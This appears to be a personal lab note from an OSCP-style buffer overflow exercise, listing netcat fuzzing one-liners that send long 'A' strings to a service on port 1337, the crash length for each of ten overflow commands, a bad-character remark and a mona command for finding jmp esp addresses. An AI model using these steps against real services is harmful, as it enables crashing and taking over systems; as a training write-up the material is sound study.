# RDP connection with Remmina 

share the folder "OSCP"

in linux file manager :

```
smb://10.10.212.22/users/admin/Desktop/vulnerable-apps/oscp

```

then copy it to linux machine then to win7 machine to start debugging :

when run it :

```
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
```


# OVERFLOW 1 :


FUZZING :
----------
keep increasing value until we got crashed when :

```python
python -c "print('OVERFLOW1 '+'A'*2000)" |nc 192.168.1.4 1337
```


check overflow1.py 


# OVERFLOW 2 :

FUZZING
---------

```py
$ python -c "print('OVERFLOW2 '+'A'*700)" |  nc 192.168.1.4 1337 
```


check overflow2.py



# OVERFLOW 3 :


FUZZING
--------

```py
python -c "print('OVERFLOW3 '+'A'*1300)" |  nc 192.168.1.4 1337 
```

note that  :


the /x11 is a badchar and it is almost in all addresses of ``jmp esp`` so we must pick one doesn't contain any badchar as it will be added to payload sent 

# we can make a POC by setting a breakpoint at the instruction then send ``"A"*offset + address`` and see if EIP has been overwritten successfully . 



check overflow3.py


# OVERFLOW 4 :


```py
python -c "print('OVERFLOW4 '+'A'*2100)" |  nc 192.168.1.5 1337 
```

check overflow4.py

# OVERFLOW 5 :

using the fuzzer it crashes at 600 bytes


!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"


# OVERFLOW 6 :

crashes at 1100



# OVERFLOW 7 :

Fuzzing crashed at  1400 bytes



# OVERFLOW 8 :


Fuzzing crashed at  1800 bytes




# OVERFLOW 9 :


Fuzzing crashed at  1600 bytes





# OVERFLOW 10 :




Fuzzing crashed at  600 bytes
